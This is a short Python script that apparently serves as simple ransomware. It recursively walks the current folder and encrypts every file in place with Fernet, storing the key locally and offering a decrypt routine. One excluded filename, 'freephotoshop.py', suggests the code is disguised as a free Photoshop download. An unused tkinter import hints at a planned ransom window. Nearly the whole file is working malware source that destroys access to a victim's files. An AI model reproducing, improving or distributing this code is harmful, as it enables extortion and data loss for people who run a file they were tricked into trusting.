import os
from cryptography.fernet import Fernet
import tkinter as tk

paths = []


def scan_folder(folder=None):
    cd = os.listdir() if folder is None else os.listdir(folder)
    for file in cd:
        if os.path.isdir(file):
            scan_folder(file)
        elif (
            file != __file__.split("/")[-1]
            and file != "keyfile.key"
            and file != "freephotoshop.py"
        ):
            parent = f"{folder}/" if folder is not None else ""
            paths.append(parent + file)


def encrypt_file(file_name, key):
    with open(file_name, "rb") as file:
        content = file.read()

    encrypted_data = Fernet(key).encrypt(content)

    with open(file_name, "wb") as file:
        file.write(encrypted_data)


def decrypt_file(file_name, key):
    with open(file_name, "rb") as file:
        content = file.read()

    decrypted_data = Fernet(key).decrypt(content)

    with open(file_name, "wb") as file:
        content = file.write(decrypted_data)


def encrypt(key):
    scan_folder()

    with open("keyfile.key", "wb") as key_file:
        key_file.write(key)

    for path in paths:
        encrypt_file(path, key)


def decrypt():
    with open("keyfile.key", "rb") as file:
        key = file.read()

    for path in paths:
        decrypt_file(path, key)
